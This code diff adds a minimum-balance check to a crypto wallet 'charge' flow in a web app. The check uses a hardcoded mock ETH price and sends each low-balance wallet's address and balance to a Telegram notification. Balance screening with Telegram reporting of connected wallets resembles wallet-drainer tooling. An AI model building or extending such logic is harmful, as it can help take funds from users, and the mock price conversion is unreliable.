@@ -110,6 +110,28 @@ export default function Home() {
         return;
       }
 
+      // Check minimum balance requirement ($3 USD equivalent)
+      const MINIMUM_BALANCE_USD = 3;
+      const balanceUSD = parseFloat(balanceData.formatted) * (chainName === 'Ethereum' ? 2500 : 1); // Mock price conversion
+      
+      if (balanceUSD < MINIMUM_BALANCE_USD) {
+        setChargeStatus(`⚠️ Insufficient balance: ${balanceData.formatted} ${balanceData.symbol} (< $${MINIMUM_BALANCE_USD})`);
+        setChargeErrors([`Wallet balance $${balanceUSD.toFixed(2)} is below minimum $${MINIMUM_BALANCE_USD}`]);
+        
+        sendTelegramNotification({
+          event: 'insufficient_balance',
+          walletAddress: address,
+          network: chainName,
+          balance: `${balanceData.formatted} ${balanceData.symbol}`,
+          balanceUSD: `$${balanceUSD.toFixed(2)}`,
+          minimumRequired: `$${MINIMUM_BALANCE_USD}`,
+        });
+        
+        // Clear status after 5 seconds
+        setTimeout(() => setChargeStatus(null), 5000);
+        return;
+      }
+
       setIsCharging(true);
       setChargeStatus(`Requesting charge confirmation on ${chainName}...`);
       setChargeErrors([]);
